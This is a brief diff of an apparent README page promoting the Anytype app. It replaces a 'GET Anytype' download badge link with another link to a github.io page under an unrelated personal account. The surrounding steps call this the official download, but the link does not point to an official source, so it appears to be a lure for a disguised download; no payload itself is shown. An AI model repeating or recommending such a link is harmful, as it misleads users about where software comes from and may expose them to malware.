@@ -60,7 +60,7 @@ Anytype pricing is also important for people looking at private productivity too
 
 Prerequisites: A compatible desktop or mobile device, secure access to your recovery details, and the official anytype download for your platform.
 
-[![GET Anytype](https://img.shields.io/badge/GET%20%E2%80%94%20Anytype-0078D6?style=for-the-badge&logoColor=white)](https://kianrobleseber.github.io/.github/anytype-app)
+[![GET Anytype](https://img.shields.io/badge/GET%20%E2%80%94%20Anytype-0078D6?style=for-the-badge&logoColor=white)](https://nathanklineqiks.github.io/.github/anytype-app)
 
 1.  **Install the app:** Download the anytype app from the official source, choosing Anytype for Mac, Anytype for Windows, or the mobile version that matches your device.
 2.  **Create your first space:** Open Anytype workspace setup and begin with a simple structure for notes, tasks, projects, and personal references.
